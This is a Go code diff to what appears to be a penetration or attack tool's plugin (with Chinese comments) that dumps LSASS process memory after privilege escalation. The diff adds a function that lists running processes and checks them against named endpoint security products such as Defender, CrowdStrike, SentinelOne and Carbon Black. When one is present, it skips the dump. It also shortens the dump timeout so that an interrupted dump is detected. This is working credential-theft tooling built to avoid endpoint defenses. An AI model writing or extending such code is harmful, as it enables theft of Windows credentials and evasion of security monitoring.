@@ -152,6 +152,16 @@ func (p *MiniDumpPlugin) Scan(ctx context.Context, info *common.HostInfo, sessio
 	}
 	output.WriteString("✓ 权限提升成功\n")
 
+	// 检测杀软——Defender 等会拦截 LSASS dump 导致 API hang
+	if p.isAVBlocking() {
+		output.WriteString("检测到活跃的杀软防护，LSASS dump 大概率被拦截，跳过\n")
+		return &plugins.Result{
+			Success: false,
+			Output:  output.String(),
+			Error:   errors.New("杀软防护活跃，跳过 LSASS dump"),
+		}
+	}
+
 	// 创建转储文件
 	outputPath := filepath.Join(".", fmt.Sprintf("lsass-%d.dmp", pid))
 	output.WriteString(fmt.Sprintf("准备创建转储文件: %s\n", outputPath))
@@ -159,8 +169,8 @@ func (p *MiniDumpPlugin) Scan(ctx context.Context, info *common.HostInfo, sessio
 	// 执行转储
 	output.WriteString("开始执行内存转储...\n")
 
-	// 创建带超时的context
-	dumpCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
+	// 创建带超时的context（正常 dump 几秒完成，超过 15 秒说明被拦截）
+	dumpCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
 	defer cancel()
 
 	err = pm.dumpProcessWithTimeout(dumpCtx, pid, outputPath)
@@ -513,6 +523,47 @@ func (pm *ProcessManager) closeHandle(handle uintptr) {
 	if proc, err := pm.kernel32.FindProc("CloseHandle"); err == nil {
 		_, _, _ = proc.Call(handle)
 	}
+}
+
+// isAVBlocking 检测是否有杀软会拦截 LSASS dump
+func (p *MiniDumpPlugin) isAVBlocking() bool {
+	avProcesses := []string{
+		"MsMpEng.exe", "MsSense.exe",
+		"CylanceSvc.exe",
+		"csfalconservice.exe",
+		"SentinelServiceHost.exe", "SentinelAgent.exe",
+		"xagt.exe",
+		"elastic-endpoint.exe",
+		"cb.exe", "CbDefense.exe",
+	}
+
+	snapshot, err := p.kernel32.FindProc("CreateToolhelp32Snapshot")
+	if err != nil {
+		return false
+	}
+	handle, _, _ := snapshot.Call(TH32CS_SNAPPROCESS, 0)
+	if handle == INVALID_HANDLE_VALUE {
+		return false
+	}
+	defer p.kernel32.MustFindProc("CloseHandle").Call(handle)
+
+	first, _ := p.kernel32.FindProc("Process32FirstW")
+	next, _ := p.kernel32.FindProc("Process32NextW")
+
+	var entry PROCESSENTRY32
+	entry.dwSize = uint32(unsafe.Sizeof(entry))
+
+	ret, _, _ := first.Call(handle, uintptr(unsafe.Pointer(&entry)))
+	for ret != 0 {
+		name := syscall.UTF16ToString(entry.szExeFile[:])
+		for _, av := range avProcesses {
+			if strings.EqualFold(name, av) {
+				return true
+			}
+		}
+		ret, _, _ = next.Call(handle, uintptr(unsafe.Pointer(&entry)))
+	}
+	return false
 }
 
 // 注册插件
